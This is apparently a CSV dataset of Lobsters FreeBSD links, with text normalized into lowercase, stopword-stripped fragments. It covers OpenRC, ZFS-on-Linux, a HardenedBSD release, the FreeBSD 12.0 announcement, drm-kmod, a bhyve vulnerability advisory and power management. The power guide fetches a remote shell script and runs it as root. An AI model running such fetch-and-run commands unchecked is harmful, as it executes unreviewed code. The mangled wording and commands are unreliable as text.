278,Lobsters,freebsd,FreeBSD,OpenRC on FreeBSD,https://lists.freebsd.org/pipermail/freebsd-hackers/2018-December/053740.html,openrc freebsd,openrc freebsd miwi freebsdorg http http http http wwwwonkitycomwblockopenrcopenrcrcdpdf http wwwwonkitycomwblockopenrcopenrcrcdpdf information freebsdhackers mailing list,openrc freebsd martin wilke miwi freebsdorg wed dec utc hi like reopen discussion openrc freebsd basically second attempt get freebsd opened review working patch current http recap discussion first attempt rfc march http working group bsdcan http key point openrc provides additional feature service management without requiring kernel change replacing pid unlike launchd solution rcd script converted change typically changing shebang making sure start function named start service script simplified usually needing name command required depends statement history openrc started init system roy marples developed gentoo alt freebsd kernel branch widely adopted gentoo baselayout split separate bsdlicensed project active development portable remains bsd licensed today openrc rc coexist chosen setting bootloaderconf openrc feature service supervision service monitoring service supervised supervised service crash automatically restarted rcstatus command show many time service restarted device hotplug support eventdriven service management hotplug feature allows devd take action device connected example usb wifi adapter create additional network service attached netonline service example detect network connection restored restart ntp network profile using stacked runlevels different profile established different networking setting instance different profile used wired wireless networking differing wireless network well dependency caching parallel startup speed booting interactive mode boot process run interactively effective debugging openrc us term runlevels refer context script running three present sysinit openrc system starting boot start base service computer booting default normal execution openrc default provides colorized text boot using ansi color sequence disabled port july ixsystems created openrc version port service script entire port tree script coexist rcd version license openrc bsd licensed rc init system written c user perspective similar freebsd rcd init system making easy use learn tested openrc used init system trueos since october ken moore openrc v rcd comparison found http wwwwonkitycomwblockopenrcopenrcrcdpdf http wwwwonkitycomwblockopenrcopenrcrcdpdf look forward discus feature capability openrc regard martin information freebsdhackers mailing list
279,Lobsters,freebsd,FreeBSD,The Future of ZFS in FreeBSD,https://lists.freebsd.org/pipermail/freebsd-current/2018-December/072422.html,future zfs freebsd,future zfs freebsd mmacy freebsdorg http http githubcomzfsonfreebsdzof http githubcommiwifbsdzofport http information freebsdcurrent mailing list,future zfs freebsd matthew macy mmacy freebsdorg wed dec utc source freebsd zfs support currently taken directly illumos local ifdefs support peculiarity freebsd solaris portability layer spl shim fall short freebsd regularly pulled change illumos tried push back bug fix new feature done context freebsd past year vast majority new development zfs taken place delphixos zfsonlinux zol earlier year delphix announced moving zol http shift mean little net new development illumos working git history zol also discovered many race locking bug fixed zol never made back illumos thus freebsd state affair led general agreement among stakeholder spoken make sense rebase freebsd zfs zol brian behlendorf graciously encouraged add freebsd support directly zol http githubcomzfsonfreebsdzof might single shared code base port zof found http githubcommiwifbsdzofport committed additional functionality need added freebsd opencrypto framework found http port provide freebsd user multi modifier protection project quota encrypted datasets allocation class vectorized raidz vectorized checksum various command line improvement zof merged back zol several step need taken integrate freebsd support zol ci zfs test suite passing complete additional qa testing ix ix system need port zol ci script work freebsd make sure zfs test suite zts pass integrated ci mean among thing integration issue caught pr merged upstream rather many month later mfved freebsd hoping submit pr zol time january port make easy end user range release run latest version zfs nonetheless transitioning away illumos based zfs likely entirely seamless stakeholder spoken agree best path forward degree effort need made accommodate downstream consumer current plan import zof unhook older illumos based source build april two month ix system qa deems zof stable ever come later illumos based source removed time later well give user month period port legacy illumos based zfs available user pool interoperate zof legacy provided user enable feature available zof try accommodate downstream consumer event need date pushed back ask downstream consumer particularly sensitive change start testing port formally announced report back issue best ensure message communicated may concern however ensure everyone read list responsibility current user information freebsdcurrent mailing list
280,Lobsters,freebsd,FreeBSD,Stable release: HardenedBSD-stable 12-STABLE v1200058,https://hardenedbsd.org/article/op/2018-12-17/stable-release-hardenedbsd-stable-12-stable-v1200058,stable release hardenedbsdstable,introducing hardenedbsd noncrossdso cfi noncrossdso cfi installer image http,introducing hardenedbsd first public release branch contains lot security improvement among improvement noncrossdso controlflow integrity cfi application time cfi applied kernel info cfi jailed bhyve perjail toggle unprivileged process debugging securitybsdunprivilegedprocessdebug sysctl node spectre mitigation retpoline applied entirety base port symmetric multithreading smt disabled default reenable setting machdephyperthreadingallowed loaderconf migration compiler toolchain component llvm implementation llvmar llvmnm llvmobjdump compilation application linktime optimization lto noncrossdso cfi noncrossdso cfi exploit mitigation technique help prevent attacker modifying behavior program jumping undefined arbitrary memory location microsoft implemented variant cfi term control flow guard cfg pax team spent last year perfecting reuse attack protector rap cfi cfg rap attempt accomplish goal rap complete effective implementation clang cfi stronger microsoft cfg pax team rap stronger cfi cfg rap would great addition hardenedbsd however requires toolchain patented clang cfi requires linker support linktime optimization lto hardenedbsd ship lld default linker cfi scheme enabled nearly application base please note application call function pointer resolved via dlopen dlsym require cfiicall scheme disabled installer image http begin pgp signature end pgp signature
281,Lobsters,freebsd,FreeBSD,FreeBSD 12.0-RELEASE Now Available,https://lists.freebsd.org/pipermail/freebsd-announce/2018-December/001856.html,freebsd available,freebsdannounce freebsd available gjb freebsdorg http http http wwwfreebsdorgreleng http http http wwwfreebsdmallcom http http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free http http http http wwwfreebsdorgsecurity gjb freebsdorg kib freebsdorg antoine freebsdorg bdrewery freebsdorg blackend freebsdorg rgrimes freebsdorg delphij freebsdorg remko freebsdorg emaste freebsdorg hr freebsdorg glebius freebsdorg marius freebsdorg gordon freebsdorg http wwwfreebsdfoundationorgdonate information freebsdannounce mailing list,freebsdannounce freebsd available glen barber gjb freebsdorg tue dec utc begin pgp signed message hash freebsd announcement freebsd release engineering team pleased announce availability freebsd first release branch highlight openssl updated version lts unbound updated version daneta enabled default openssh updated version additonal capsicum support added sshd clang llvm lld lldb compilerrt libc updated version vt terminus bsd console font update version bsdinstall utility support uefigeli installation option vimage kernel configuration option enabled default numa option enabled default generic minimal kernel configuration netdump driver added providing facility kernel crash dump transmitted remote host system panic vt driver updated performance improvement drawing text rate ranging faster various improvement graphic support current generation hardware support capsicum enabled default ufsffs filesystem updated consolidate trimbiodelete command reducing readwrite request due fewer trim message sent simultaneously nfs version server updated include pnfs server support pf packet filter usable within jail using vnet bhyve utility updated add nvme device emulation bhyve utility able run withing jail various lua loader improvement kde updated version complete list new feature known problem please see online release note erratum list available http http information freebsd release engineering activity please see http wwwfreebsdorgreleng availability freebsd available powerpc powerpcspe architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded described section hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available http pgpsigned version announcement available http purpose image provided part release follows contains everything necessary install base freebsd operating system documentation debugging distribution set small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium additionally written usb memory stick flash drive architecture used install machine capable booting usb drive also support booting livefs based rescue mode one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct contains base freebsd operating system also support booting livefs based rescue mode prebuilt package additionally written usb memory stick flash drive architecture used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg http ftp server booting cd additionally written usb memory stick flash drive architecture used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product freebsd mall inc http wwwfreebsdmallcom preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amazon r tm amis available following region region region region region region region region region region region region region region region region amis also available amazon r marketplace http google r compute engine tm instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance freebsd also available google compute engine tm marketplace completed thirdparty specific validation http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free hashicorpatlas r vagrant tm instance deployed using vagrant utility vagrant init vagrant download freebsd may downloaded via http following site http freebsd virtual machine image may downloaded http instruction installing freebsd updating existing machine please see http support based discussion surrounding reviewing freebsd support model freebsd release series supported least june information please see official announcement regarding upcoming discussion support model http wwwfreebsdorgsecurity acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium bytemark hosting sentex communication new york internet juniper network nlnet lab ixsystems cyberone data national chiao tung university release engineering team includes glen barber gjb freebsdorg release engineering lead release engineer konstantin belousov kib freebsdorg release engineering antoine brodin antoine freebsdorg package building bryan drewery bdrewery freebsdorg release engineering package building marc fonvieille blackend freebsdorg release engineering documentation rodney grime rgrimes freebsdorg release engineering xin li delphij freebsdorg release engineering remko lodder remko freebsdorg security officer deputy security team liaison ed maste emaste freebsdorg security officer deputy hiroki sato hr freebsdorg release engineering documentation gleb smirnoff glebius freebsdorg release engineering marius strobl marius freebsdorg release engineering deputy lead gordon tetlow gordon freebsdorg security officer trademark freebsd registered trademark freebsd foundation iso image checksum powerpc powerpcspe generic rpib bananapi beaglebone cubieboard cuboxhummingboard genericsd pandaboard wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature szne end pgp signature information freebsdannounce mailing list
282,Lobsters,freebsd,FreeBSD,FreeBSD Graphics Blog - Getting Started With drm-kmod,https://freebsddesktop.github.io/2018/12/08/drm-kmod-primer.html,freebsd graphic blog getting started drmkmod,getting started drmkmod drmkmod work validate hardware supported installing port need install driver provide xorg configuration autodetection work validate hardware accelleration working support older system final thought http wikifreebsdorggraphics command configs impatient pete wright,getting started drmkmod exciting time freebsd graphic put lot effort provide support modern graphic hardware mean well example purchased laptop past year getting graphic support hit miss freebsd people would opt purchase system nvidia gpu rely propritary driver provide system integrated intel hd amd radeon gpu arguably compose majority market share great answer forcing user use software accellerated graphic worse another o fortunately longer case introduction drmkmod port blog post serve primer providing bit background walk getting thing working impatient check tl dr section end copypasta required command without understanding happening right drmkmod drm stand direct rendering manager term taken linux kernel development community refering solved issue dealing newer graphic processor expose api let userspace application directly interact gpu among thing great wikipedia entry help clarify lot confusing vocabulary freebsd approached gaining support modern gpus levaraging work already done linux community kernel module given gpu loaded one intel chip another amd driver interact freebsd via updated lkpi linux kernel programming interface approach allowed u import linux driver relatively minor modification hopefully ease longterm freebsd support future post lkpi work freebsd need know closely follow upstream linux driver development gpu use freebsd infact often support lastest linux driver code many linux distribution released updated package writting post system using linux drm code speak whereas system running linux kernel pretty slick stuff ask work addition making long term support easier lot effort gone making process installing driver seamless possible hopefully update bsdinstall automate setup process soon actually quite easy need system haswell newer intel hd graphic see list system amd radeon amd gpu newer see list system running freebsd newer validate hardware supported installing fresh copy easy determine generation graphic processor system rebooted installation log run pciconf find easier pipe le going look registered vgapci pciconf lvless unrelated output vendor intel corporation device hd graphic class display subclass vga ok go pciconf report intel hd graphic device kaby lake generation laptop good go system amd radeon gpu installed registered well nothing reported possible older system cover case later good news system whose graphic detected available install drmkmod port let installing port mentioned earlier lot effort gone making process easy enduser hopefully illustrate install driver system install drmkmod port package prefer use package case compiling port tree work well let see installation look like pkg search drmkmod metaport drm module linuxkpibased km component sudo pkg install drmkmod updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed drmkmod freebsd drmnextkmod freebsd number package installed process require mib space mib downloaded proceed action yn fetching mib checking integrity done conflicting installing extracting installing message drmnextkmod port enabled amdgpu amd gpus starting series tahiti intel apus starting sandy bridge kldlist etcrcconf radeonkms older amd gpus loaded positive report efi boot enabled similar amdgpu amdgpu kldlist amdgpu intel kldlist radeonkms kldlist bootmodulesradeonkmsko please ensure user requiring graphic member video group older generation supported legacy km module radeonkms base installing graphicsdrmlegacykmod point important read post install message wil note critical detail following postinstall step matter restarting system ensure kmod loaded cleanly starting preferred window manager seriously oh one final note need install driver provide xorg configuration autodetection work validate hardware accelleration working want make sure gpu enabled look dmesg search line prefaced drm show kernel module loaded case last relevant line say following drm initialized minor futhermore also install mesademos package search renderer run glxinfo like glxinfo grep renderer glxmesamultithreadmakecurrent glxmesaqueryrenderer glxmesaqueryrenderer glxmesaswapcontrol glxomlswapmethod extended renderer info glxmesaqueryrenderer opengl renderer string mesa dri intel r hd graphic kaby lake huzzah success time play game watch video even get work done support older system system older haswell era intel cpu historically driver hardware included base freebsd o continue expectation removed version prepare eventuality new port created named drmlegacykmod one older system problem graphic using drmkmod port please try legacy version final thought hope blog post helpful started helping work part freebsd due fact laptop work use sysadmin work due lack supported graphic noticed lot developer recently much work apple laptop pretty understandable lug around two laptop daily since still rough edge need use macos goal help get thing updated enough developer could dogfood code working hopefully happen least able scratch itch also updated freebsd graphic wiki check http wikifreebsdorggraphics plan keep regularly updated support platform chipsets brought onboard command configs impatient install drmkmod metaport sudo pkg install drmkmod ensure kernel module loaded boot substitute amdgpu newer amd gpu sudo sysrc kldlist kldlist ifiwm ifiwm ensure uid member video group sudo pw groupmod video user reboot system start x normally written pete wright
283,Lobsters,freebsd,FreeBSD,2 years of Unix newsletters,https://newsletter.nixers.net/entries.php#104,year unix newsletter,nixers newsletter unix http wwwbrendangreggcomspecialsmkzombieexampletxt http sebpearcecombullshit http vimadventurescom rocx rock skteches http imgurcomaobjvr random thought http markmansonnetnotgivingafuck contribute,nixers newsletter unix brace horror story continue horror story many argument internet linux purity unix system argument discarded others serious like criticism constructive take lightly required stay stable enterprise world following posix open group standard euleros kux derived redhat prove even though nt derived original unix hood different architecture article go root issue hilarious oldie script could possibly useful one http wwwbrendangreggcomspecialsmkzombieexampletxt turbo button one weird thing past nt mean much day continue series link j web one emulation running shell browser last time heard pwning website webshells last link research paper give another interesting side story programmer get pissed lot useless semantics etymology epistemology fun way put thing back perspective reminds newage bullshit generator http sebpearcecombullshit last week mixed two link http vimadventurescom passweird sorry bout fellow vim adventure great really addictive way learn vim though free please come back forum love rocx rock skteches sketch related one link http imgurcomaobjvr random share wtf secret ever wondered code movie really nt shy ask question contribute conversation thought art giving fuck ever watch kid cry eye hat wrong shade blue exactly http markmansonnetnotgivingafuck contribute many way contribute find anything interesting contact venam forum may featured next newsletter share friend share point view newsletter open thread forum discus one topic brought reading newsletter want help forum server fee send something new patreon page http wwwpatreoncomvenam ask dcat help irc
284,Lobsters,freebsd,FreeBSD,Insufficient bounds checking in bhyve(8) device model,https://www.freebsd.org/security/advisories/FreeBSD-SA-18:14.bhyve.asc,insufficient bound checking bhyve device model,,begin pgp signed message hash security advisory freebsd project topic insufficient bound checking bhyve device model category core module bhyve announced credit reno robert affect supported version freebsd corrected utc utc cve name general information regarding freebsd security advisory including description field security branch following section please visit background bhyve hypervisor us bhyve program emulate support virtual device used guest operating system ii problem description insufficient bound checking one device model provided bhyve permit guest operating system overwrite memory bhyve processing possibly permitting arbitary code execution iii impact guest o using firmware image cause bhyve process crash possibly execute arbitrary code host root iv workaround device model question enabled booting guest firmware image uefi image bhyvefirmware package guest booted using bhyveload affected guest using operating system supported bhyveload booted using tool workaround workaround available guest operating system window require firmware image v solution perform one following upgrade vulnerable system supported freebsd stable release security branch releng dated correction date update vulnerable system via binary patch system running release version freebsd platform updated via freebsdupdate utility freebsdupdate fetch freebsdupdate install afterward restart guest using firmware image update vulnerable system via source code patch following patch verified apply applicable freebsd release branch download relevant patch location verify detached pgp signature using pgp utility fetch http fetch http gpg verify bhyvepatchasc b apply patch execute following command root cd usrsrc patch pathtopatch c recompile operating system using buildworld installworld described afterward restart guest using firmware image vi correction detail following list contains correction revision number affected branch branchpath revision see file modified particular revision run following command replacing nnnnnn revision number machine subversion installed svn diff cnnnnnn summarize svn svnfreebsdorgbase visit following url replacing nnnnnn revision number vii reference latest revision advisory available begin pgp signature end pgp signature
285,Lobsters,freebsd,FreeBSD,The Power to Serve - FreeBSD Power Management,https://vermaden.wordpress.com/2018/11/28/the-power-to-serve-freebsd-power-management/,power serve freebsd power management,deviatart power resource management power management freebsd wiki information cpu frequency scaling usb device sataahci power management device without driver suspend resume network interface vendor tool dtrace hardware information battery acpiconf acpiconf acpiconf acpiconf sysctl hwacpibatterytime sysctl hwacpibattery sysctl hwacpibattery battery wear batterycapacitysh batterycapacitysh cpu sysctl sysctl sysctl grep freebsdsmp varrundmesgboot sysctl kernsmpcpus sysctl pkg install lscpu kldload cpuctl lscpu grep cpu varrundmesgboot cpu frequency scaling pkg install powerdxx howto freebsd cpu scaling power saving cstates tail f varlogmessages sysctl grep cxlowest etcsysctlconf cpu turbo mode sysctl sysctl sysctl usb device usbconfig usbconfig u powersave grep power etcrclocal sataahci power management grep ahcich varrundmesgboot hintahcichxpmlevel device without driver hwpcidopowernodriver pciconf l pciconf l v nvidia optimus mkdir rootbin cd rootbin fetch http peoplefreebsdorgxmjturnoffgpush pkg install acpicall kldload acpicall chmod x rootbinturnoffgpush rootbinturnoffgpush suspend resume sysctl hwacpisupportedsleepstate zzz acpiconf kldload acpiibm sysctl devacpiibm crontab l network interface ifconfig powersave freebsd network management vendor tool pkg install powermon kldload cpuctl powermon dtrace pkg install dtracetoolkit usrlocalsharedtracetoolkitexecsnoop freebsd desktop part configuration zfs application hardware update graphic card power saving update amd cpu temperature update suspendresume tip like,motto freebsd operating system power serve also greatly fit topic article decade ago yes time fly even made wallpaper motto still available deviatart page time freebsd article covering power management feature also applies freebsd desktop series limited popular opinion seems freebsd server oriented lack power management mechanism nothing far truth le important desktop still lower electricity bill server desirable properly configure power management laptop longer battery life run quiet write freebsd handbook cover information power resource management chapter freebsd laptop article part power management ancient time freebsd information freebsd wiki page part outdated freebsd offer many mechanism power management department power device without attached driver scale cpu frequency power support cpu sleep state enablingdisabling turbo mode available cpu per usb device power management option sataahci channelscontrollers power management suspendresume support along using laptop lid support vendor specific tool help measure power management tool acpi support fan speed control tool acpi support setting screen brightness battery capacity status running time estimation network interface power saving option one word different file setting freebsd system etcrcconf require reboot daemon reloading etcsysctlconf require reboot set runtime bootloaderconf setting require reboot table content nonclickable article information battery battery wear cpu lscpu dmesg cpu frequency scaling powerd powerdxx cstates cpu turbo mode usb device sataahci power management device without driver suspend resume network interface vendor tool dtrace hardware update graphic card power saving update amd cpu temperature update suspendresume tip information let start describing get needed information current cpu speed used cstates current power management mode usb device battery capacity remaining time etc battery get battery information use acpiconf tool acpiconf output main battery thinkpad laptop ac power attached acpiconf design capacity mwh last full capacity mwh technology secondary rechargeable design voltage mv capacity warn mwh capacity low mwh lowwarn granularity mwh warnfull granularity mwh model number serial number type lion oem info sanyo state high remaining capacity remaining time unknown present rate mw present voltage mv ac power detached acpiconf design capacity mwh last full capacity mwh technology secondary rechargeable design voltage mv capacity warn mwh capacity low mwh lowwarn granularity mwh warnfull granularity mwh model number serial number type lion oem info sanyo state high remaining capacity remaining time present rate mw present voltage mv ac power detached laptop remaining time field show remaining time estimation single battery show two hour thirty one minute acpiconf output secondary battery thinkpad ultrabay instead dvd drive acpiconf design capacity mwh last full capacity mwh technology secondary rechargeable design voltage mv capacity warn mwh capacity low mwh lowwarn granularity mwh warnfull granularity mwh model number serial number type lip oem info sony state high remaining capacity remaining time unknown present rate mw present voltage mv ac power detached acpiconf design capacity mwh last full capacity mwh technology secondary rechargeable design voltage mv capacity warn mwh capacity low mwh lowwarn granularity mwh warnfull granularity mwh model number serial number type lip oem info sony state discharging remaining capacity remaining time present rate mw present voltage mv ac power detached show remaining time secondary battery total time battery estimated time minute shown sysctl value named hwacpibatterytime shown sysctl hwacpibatterytime hwacpibatterytime also get complete battery information sysctl value hwacpibattery mib sysctl hwacpibattery hwacpibatteryinfoexpire hwacpibatteryunits hwacpibatterystate hwacpibatterytime hwacpibatterylife hwacpibatterytime show value ac power attached sysctl hwacpibattery hwacpibatteryinfoexpire hwacpibatteryunits hwacpibatterystate hwacpibatterytime hwacpibatterylife battery wear time pass battery lose design capacity year battery le original efficiency information needed check provided acpiconf command design capacity last full capacity value made batterycapacitysh script tell current battery efficiency look action batterycapacitysh battery model efficiency batterycapacitysh battery model efficiency batterycapacitysh script binsh ne echo usage battery exit fi acpiconf devnull devnull data acpiconf max echo data grep design capacity awk f print tr c echo data grep last full capacity awk f print tr c mod echo data grep model number awk f print awk print echo n battery model mod efficiency printf n bc l e scale max e quit else echo nope battery exists system echo info system battery exit fi cpu get information current cpu use devcpu mib first physical cpu core sysctl last parent pnpinfo hidnone location driver cpu desc acpi cpu load coretemp kernel module kldload command get additional temperature information sysctl mib coretemp kernel module loaded sysctl last parent pnpinfo hidnone location driver cpu desc acpi cpu let describe useful one cpu core temperature cpu supported cstates cpu cpu statistic cstates usage state used last cpu maximum deep c state enabled cpu supported frequency level power usage character read ghz frequency w power usage turbo mode lowest mhz w usage cpu current frequency vary use powerd powerdxx daemon mib also show current thermal zone temperature sysctl check many core use command grep freebsdsmp varrundmesgboot freebsdsmp multiprocessor system detected cpu freebsdsmp package x core sysctl kernsmpcpus kernsmpcpus description feel useful also check flag sysctl command shown sysctl current cpu frequency lscpu also third party tool called lscpu describe cpu feature model add package pkg install lscpu make lscpu work cpuctl kernel module needed look dual core cpu kldload cpuctl lscpu architecture byte order little endian total cpu thread per core core per socket socket vendor genuineintel cpu family model model name intel r core tm cpu stepping cache cache cache cache flag fpu vme de pse tsc msr pae mce apic sep mtrr pge mca cmov pat cflsh d acpi mmx fxsr sse s htt tm pbe pclmulqdq monitor dscpl vmx smx est xtpr pdcm pcid popcnt tscdeadline aes xsave osxsave avx syscall nx rdtscp lm lahflm dmesg also dmesg command varrundmesgboot file longer uptime cover cpu model feature information grep cpu varrundmesgboot cpu intel r core tm cpu cpu freebsdsmp multiprocessor system detected cpu cpu frequency scaling cpu scaling feature may use powerd daemon available freebsd base system powerdxx freebsd port package powerdxx daemon aim better scale multicore system turning core high state moderate load system people may prefer approach full power available anything save power nothing thus powerd better powerdxx vice versa different give option need matter one choose configured etcrcconf file powerd option powerd daemon powerdenableyes powerdflags n adaptive hiadaptive b adaptive n option unknown state reason powerd able determine running ac power battery ac power b running battery adaptive setting le aggressive battery time friendly hiadaptive aggressive preferred running ac power option set minimum cpu frequency used maximum mhz unit check powerd man page detail powerdxx first need install pkg install powerdxx option identical powerd daemon powerdxxenableyes powerdxxflags n adaptive hiadaptive b adaptive check powerdxx section flagsparameters description decade ago cpu frequency scaling freebsd easy may check old howto freebsd cpu scaling power saving topic cstates cstates configured etcrcconf file option performancecxlowest economycxlowest economycxlowest parameter running battery performancecxlowest parameter running ac power set using etcrcdpowerprofile script used rc subsystem set hwacpicpucxlowest parameter setscontrols devcpu cxlowest value also track change varlogmessages file attachdetach ac power tail f varlogmessages nov powerprofile changed economy nov powerprofile changed performance usually jest use value economycxlowestcmax setting generally sufficient system check cstates cpu support get value mib sysctl cpu support may support remember using old core duo laptop state quite noticeable delay getting back running state sleep state following setting needed use performancecxlowest economycxlowest parameter set first core core way even battery fully responsive system core may sleep save energy example would core maximum deepest supported cstate would would put etcsysctlconf file grep cxlowest etcsysctlconf cpu turbo mode two way enable turbo mode one way set powerd powerdxx daemon maximum frequency set nominal cpu speed example cpu described dualcore ghz set maximum speed flag example would mean use cpu frequency scaling daemon use parameter highest first value mib supported cpu frequency level system sysctl highest value left need set parameter value use turbo mode need use frequency value part paste power requirement description fail sysctl sysctl invalid integer used sysctl usb device list attached usb device use usbconfig tool usbconfig mdhost spdsuper pwrsave mdhost spdhigh pwrsave mdhost spdhigh pwrsave mdhost spdhigh pwrsave mdhost spdhigh pwrsave mdhost spdfull pwron mdhost spdhigh pwrsave see pwr parameter short power show current power setting set new usb power option device also use usbconfig tool powersave parameter following way usbconfig u powersave usb power management dedicated config file freebsd put universal etcrclocal file run end startup process managed rc subsystem added content exception lenovo usb receiver wireless mouse grep power etcrclocal power save usb device usbconfig grep v lenovo usb receiver awk print sed sugen g tr awk f print read u usbconfig u u powersave devnull done good idea save power mouse tracked device probably find annoying wait second time would like use use loop set power saving usb device except wireless usb mouse identified lenovo usb receiver device sataahci power management freebsd offer ahci channel power management via acpich driver power management setting cen set boot using hintahcich pmlevel parameter bootloaderconf file use configuration channel three grep ahcich varrundmesgboot channel channel channel bus target lun setting nonexistent device harmless display error message use different setting various system save time hintahcich pmlevel description ahci man page hintahcichxpmlevel control sata interface power management specified channel allowing power saved cost additional command latency controller implement mode ncq used artificial entering latency performance degradation mode much smaller mode possible power management option interface power management disabled default device allowed initiate pm state change host passive host initiate partial pm state transition every time port becomes idle host initiate slumber pm state transition every time port becomes idle driver initiate partial pm state transition port becomes idle driver initiate slumber pm state transition port becomes idle setting bootloaderconf file ahci power management every used channel ahcich device without driver freebsd power saving option power device attached driver called hwpcidopowernodriver set bootloaderconf file description pci man page hwpcidopowernodriver default place device low power state suitable device driver found set one following value device left fully powered default like except storage controller also powered power device displaymemoryperipherals powered power pci device without device driver setting bootloaderconf file power device without attached driver pciconf utility show device system driver attached driver attached see none device also check man page driver like em man page device xhci page device pciconf l also use v flag get detailed information pciconf l v vendor nec corporation device usb host controller class serial bus subclass usb nvidia optimus reason biosuefi firmware allow disable nvidia discrete graphic card may use script disable drain power system requires acpicall kernel module provided acpicall package mkdir rootbin cd rootbin fetch http peoplefreebsdorgxmjturnoffgpush pkg install acpicall kldload acpicall chmod x rootbinturnoffgpush rootbinturnoffgpush may add etcrclocal file usb power saving option entry disable nvidia card rootbinturnoffgpush successd store working acpi call rootgpumethod file execute next time suspend resume biggest enemy supendresume mechanism bug biosuefi firmware hardware sometimes disabling bluetooth help option thinkpad example check suspend mode supported system check hwacpisupportedsleepstate mib sysctl subsystem sysctl hwacpisupportedsleepstate hwacpisupportedsleepstate enter acpi sleep state suspend use acpiconf tool zzz tool zzz acpiconf tool acpiconf exactly stated zzz man page also set sysctl value everytime close laptop lid system go sleep achieve put etcsysctlconf file matter put hardware sleep command closing lid laptop resume opening lid course closed lid zzz command either close open lid push power button resume course may also suspendresume desktop even backup server purpose limited laptop also dedicated kernel module various vendor acpi subsystem bootkernelacpiasuswmiko bootkernelacpiasusko bootkernelacpidockko bootkernelacpifujitsuko bootkernelacpihpko bootkernelacpiibmko bootkernelacpipanasonicko bootkernelacpisonyko bootkernelacpitoshibako bootkernelacpivideoko bootkernelacpiwmiko example ibmlenovo thinkpad use acpiibmko kernel module kldload acpiibm loading module get new sysctl value use example related fan speed keyboard backlit screen brightness new devacpiibm section sysctl loading acpiibm kernel module sysctl devacpiibm none parent pnpinfo location driver acpiibm desc ibm thinkpad acpi extra devacpiibm parent description interesting one one turn led light microphone mute button select want manage cpu fan leave manufacturer default cpu fan enabled set speed one tell fast cpu fan spinning rpm enabledisable wifi enabled bios enabledisable bluetooth enabled bios enabledisable thinklight muteunmute speaker speaker volume screen brightness case needed use probably use vendor defined keyboard shortcut probably fn key vendor specific dedicated button sometimes want createuse setup need custom keyboard shortcut want control fan speed depending cpu temperature way vendor predefined dedicated acpi kernel module useful example recently thought cpu fan seems little louder created custom cron based acpithinkpadfansh script use lower fan speed even lower quieter speed cpu temperature low enough post maybe find useful purpose describe shortly disables fan cpu temperature c degree set level c c degree set level temperature reach c degree binsh kldstat grep q acpiibmko doas kldload acpiibm fi doas sysctl devnull temp sysctl n awk f print temp lt doas sysctl devnull exit fi temp lt doas sysctl devnull exit fi temp ge doas sysctl devnull exit fi crontab entry crontab l acpiibmfan scriptsacpithinkpadfansh network interface also ifconfig option save power driver support feature called powersave used like ifconfig powersave use networksh network management script described broadly freebsd network management networksh article vendor tool also vendor tool available freebsd like powermon example remember requires cpuctl kernel module work pkg install powermon kldload cpuctl powermon intel r core tm cpu arch sandy bridge limit package uncore core gpu current current current current total total total total dtrace dynamic tracing framework like zfs found way solarisillumos freebsd may also useful weapon battle time battery first add dtracetoolkit package pkg install dtracetoolkit system stop saving energy wake cpu something need rundone check run system mostly run p top utility show exactly started often something run dtrace come help use usrsharedtracetoolkitexecsnoop script dtracetoolkit package print every command run argumentsit remain silent command run advised example output toolbar update usrlocalsharedtracetoolkitexecsnoop uid pid ppid args usrlocalbinzsh c binsh sysctl n kernsmpcpus p ax cpu r command c awk v idle printf smp date h sysctl n sysctl n sysctl n vmstatsvmvinactivecount sysctl n vmstatsvmvfreecount sysctl n vmstatsvmvcachecount bc l dc x grep color q binsh homevermadenscriptsconkyifipsh ifconfig u grep v grep c inet ifconfig l u sed ifconfig grep ssid grep q awk ssid print awk inet print binsh homevermadenscriptsconkyifgwsh route n v get default awk end print binsh homevermadenscriptsconkyifdnssh awk nameserver print exit etcresolvconf binsh homevermadenscriptsconkyifpingsh ping c q mixer vol awk f printf zfs list h name avail awk printf binsh homevermadenscriptsconkybatteryseparatesh sysctl n hwacpibatteryunits sysctl n hwacpibatterylife sysctl n hwacpiacline acpiconf awk state print acpiconf awk remaining capacity print acpiconf awk state print acpiconf awk remaining capacity print bsdgrep v e commandidle head sort r n awk printf tail lot process update information top screen refresh information every minute want exact information system status current moment click bar run command refresh way using dtrace know something unwanted steal precious battery time may find config freebsd desktop part configuration article zfs default zfs commit transaction group every second good default setting vfszfstxgtimeout parameter may want increase little needed example say parameter mostly lot guide advice set various performance reason keep mind setting prevent disk cpu going sleep thus draining battery life want mess vfszfstxgtimeout value set bootloaderconf file application get time battery used application also crucial example thunar us le cpu time caja nautilus geany text editor us le cpu resource memory scite gedit editor even gvim take resouces mention custom openboxfluxbox yourfavoritewm window manager based setup consume lot le cpu time entire gnome mate environment hardware sometimes possible literally buy battery time example want buy new ssd laptop pick fastest one power efficient one probably feel performance difference anyway appreciate battery time ram module come current voltage chance laptop may support low power ddr module current thus increasing battery time also keep mind ram stick us power using single 